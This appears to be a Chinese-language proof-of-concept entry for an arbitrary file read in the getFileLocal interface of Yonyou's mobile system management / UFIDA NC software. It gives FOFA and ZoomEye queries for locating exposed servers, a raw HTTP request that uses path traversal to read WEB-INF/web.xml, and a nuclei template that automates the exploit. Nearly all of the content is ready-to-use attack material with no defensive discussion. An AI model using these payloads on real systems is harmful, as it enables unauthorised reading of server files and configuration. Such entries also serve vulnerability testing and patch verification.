## 用友移动系统管理getFileLocal接口存在任意文件读取

## fofa
```
app="用友-移动系统管理"
```

## ZoomEye
```
app:"用友 UFIDA NC"
```

## poc
```
GET /portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml HTTP/1.1
Host: {}
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=B9F1AC8D34E9DFD16A3A7A4B9CEE4EF9.server
Connection: close
```

![bfcd2c07d015740a8aba3551db27bda2](https://github.com/wy876/POC/assets/139549762/8633208d-fe21-4ae2-a365-d2f45639dbc8)


## nuclei 
```
id: yonyou-ufida-nc-fileread

info:
  name: yonyou-ufida-nc-fileread
  author: HackTwo
  severity: high

  description: |
    漏洞测试-Test
  reference:
    - https://
  tags: auto

http:
  - raw:
      - |+
        GET /portal/file?cmd=getFileLocal&fileid=../../../../webapps/nc_web/WEB-INF/web.xml HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.9
        Cache-Control: no-cache
        Connection: close

    matchers:
      - type: dsl
        dsl:
          - "contains_all(body, 'version=') && status_code==200 && contains(header,'attachment; filename')"
```
